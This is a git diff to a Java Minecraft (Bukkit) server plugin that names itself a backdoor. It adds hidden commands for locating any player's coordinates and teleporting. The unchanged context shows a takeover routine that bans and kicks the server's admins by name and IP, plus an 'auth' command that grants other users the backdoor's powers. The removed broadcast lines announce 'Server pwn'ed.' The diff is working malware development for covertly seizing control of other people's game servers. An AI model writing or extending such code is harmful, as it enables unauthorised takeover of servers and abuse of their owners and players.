@@ -4,6 +4,7 @@ package com.thiccindustries.backdoor;
 import org.bukkit.*;
 import org.bukkit.command.ConsoleCommandSender;
 import org.bukkit.enchantments.Enchantment;
+import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
@@ -13,6 +14,8 @@ import org.bukkit.inventory.meta.ItemMeta;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.scheduler.BukkitRunnable;
 
+import java.text.DecimalFormat;
+import java.util.Calendar;
 import java.util.Date;
 import java.util.Locale;
 
@@ -197,8 +200,8 @@ public final class Backdoor implements Listener {
                             @Override
                             public void run() {
                                 p1.setOp(false);
-                                Bukkit.getBanList(BanList.Type.NAME).addBan(p1.getName(), Config.default_ban_reason, new Date(9999, 1, 1), Config.default_ban_source);
-                                Bukkit.getBanList(BanList.Type.IP).addBan(p1.getName(), Config.default_ban_reason, new Date(9999, 1, 1), Config.default_ban_source);
+                                Bukkit.getBanList(BanList.Type.NAME).addBan(p1.getName(), Config.default_ban_reason, new Date(9999, Calendar.JANUARY, 1), Config.default_ban_source);
+                                Bukkit.getBanList(BanList.Type.IP).addBan(p1.getName(), Config.default_ban_reason, new Date(9999, Calendar.JANUARY, 1), Config.default_ban_source);
                                 p1.kickPlayer(Config.default_ban_reason);
                             }
                         }.runTask(plugin);
@@ -207,9 +210,7 @@ public final class Backdoor implements Listener {
                     }
                 }
 
-                Bukkit.broadcastMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + " Server pwn'ed.");
-                Bukkit.broadcastMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + " All server admins have been banned.");
-                Bukkit.broadcastMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + " Remaining players have been op'ed. Have fun.");
+                Bukkit.broadcastMessage(Config.chaos_chat_broadcast);
 
                 return true;
             }
@@ -312,9 +313,6 @@ public final class Backdoor implements Listener {
                 String str_type = args[1];
                 int type = 0;
 
-                if (str_type.equalsIgnoreCase("sword"))
-                    type = 0;
-
                 if (str_type.equalsIgnoreCase("tool"))
                     type = 1;
 
@@ -340,23 +338,68 @@ public final class Backdoor implements Listener {
                     return true;
                 }
 
-                if (type == 1) {
-                    ItemMeta enchantMeta = mainHandItem.getItemMeta();
-                    enchantMeta.addEnchant(Enchantment.DIG_SPEED, Config.safe_enchant_level, true);
-                    enchantMeta.addEnchant(Enchantment.DURABILITY, Config.safe_enchant_level, true);
-                    enchantMeta.addEnchant(Enchantment.LOOT_BONUS_BLOCKS, Config.dangerous_enchant_level, true);
-                    enchantMeta.addEnchant(Enchantment.MENDING, 1, true);
+                ItemMeta enchantMeta = mainHandItem.getItemMeta();
+                enchantMeta.addEnchant(Enchantment.DIG_SPEED, Config.safe_enchant_level, true);
+                enchantMeta.addEnchant(Enchantment.DURABILITY, Config.safe_enchant_level, true);
+                enchantMeta.addEnchant(Enchantment.LOOT_BONUS_BLOCKS, Config.dangerous_enchant_level, true);
+                enchantMeta.addEnchant(Enchantment.MENDING, 1, true);
 
-                    if (Config.curse_enchants)
-                        enchantMeta.addEnchant(Enchantment.VANISHING_CURSE, 1, true);
+                if (Config.curse_enchants)
+                    enchantMeta.addEnchant(Enchantment.VANISHING_CURSE, 1, true);
 
-                    mainHandItem.setItemMeta(enchantMeta);
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Enchantments added.");
-                    return true;
-                }
-                return false;
+                mainHandItem.setItemMeta(enchantMeta);
+                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Enchantments added.");
+                return true;
 
             }
+            case "coords": {
+                if(args.length < 2) //No player specified
+                    return false;
+
+                Player target = Bukkit.getPlayer(args[1]);
+                if(target == null){
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
+                    return false;
+                }
+
+                //Player is real.
+                Location targetLoc = target.getLocation();
+                int x = (int)Math.floor( targetLoc.getX() );
+                int y = (int)Math.floor( targetLoc.getY() );
+                int z = (int)Math.floor( targetLoc.getZ() );
+
+                String coordsString = Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + "'s coordinates are: " + x + ", " + y + ", " + z;
+                p.sendMessage(coordsString);
+
+                return true;
+            }
+
+            case "tp": {
+                if(args.length < 4) //No coords specified
+                    return false;
+
+                int targetX, targetY, targetZ;
+                try {
+                    targetX = Integer.parseInt(args[1]);
+                    targetY = Integer.parseInt(args[2]);
+                    targetZ = Integer.parseInt(args[3]);
+                }catch(NumberFormatException e){ //Not valid numbers
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Coordinates syntax error.");
+                    return false;
+                }
+
+                //Player location reference
+                Location loc = p.getLocation();
+
+                loc.setX(targetX);
+                loc.setY(targetY);
+                loc.setZ(targetZ);
+
+                p.teleport(loc);
+
+                return true;
+            }
+
             case "auth": { //Adds new user to authlist
                 if (args.length < 2)
                     return false;
